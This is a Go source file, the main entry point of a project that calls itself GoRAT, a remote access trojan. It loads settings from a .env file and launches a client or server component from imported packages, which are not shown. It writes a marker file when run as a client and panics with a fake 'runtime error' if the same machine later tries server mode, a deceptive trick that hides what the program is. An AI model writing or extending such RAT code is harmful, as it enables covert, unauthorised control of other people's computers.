// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package main

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/fjah/GoRAT/client"
	"github.com/fjah/GoRAT/server"
	"github.com/joho/godotenv"
)

func main() {
	// Load .env
	err := godotenv.Load()
	chk(err)

	// Get the db filename from .env
	dbFilename := os.Getenv("DB_FILENAME")

	// Check whether to run as server or client
	if len(os.Args) <= 1 || os.Args[1] != "server" {
		// Write to a file specifying whether the previous execution was as client
		if os.Getenv("DEV_MODE") != "TRUE" {
			chk(ioutil.WriteFile(dbFilename, []byte("PRUN CLIENT"), 0644))
		}

		client.Init()
	} else {
		// Read the "db" file
		bytes, _ := ioutil.ReadFile(dbFilename)

		// If the file is nonexistent or the file contains PRUN CLIENT
		if bytes == nil || !strings.Contains(string(bytes), "PRUN CLIENT") {
			// The RAT was run as client; starting
			fmt.Println("Starting in server mode; remove the server flag to test the client.")
			server.Init()
		} else {
			// Panic with a fake error
			panic(errors.New("runtime error"))
		}
	}
}
